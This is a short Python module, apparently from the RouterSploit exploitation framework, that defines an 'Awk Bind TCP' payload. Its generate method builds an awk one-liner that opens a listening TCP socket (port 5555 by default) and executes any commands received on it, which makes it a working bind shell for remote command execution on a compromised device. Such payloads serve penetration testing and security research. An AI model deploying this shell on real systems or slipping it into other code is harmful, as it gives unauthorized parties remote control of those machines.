from routersploit import (
    exploits,
    payloads,
    validators
)


class Exploit(payloads.Payload):
    __info__ = {
        'name': 'Awk Bind TCP',
        'authors': [
        ],
        'description': '',
        'references': [
        ],
        'devices': [
        ],
    }

    architecture = "generic"
    rport = exploits.Option(5555, 'Bind Port', validators=validators.integer)
    awk_binary = exploits.Option('awk', 'Awk binary')

    def generate(self):
        self.payload = (self.awk_binary + " 'BEGIN{s=\"/inet/tcp/" + str(self.rport) + "/0/0\";"
                        "for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)\}'")

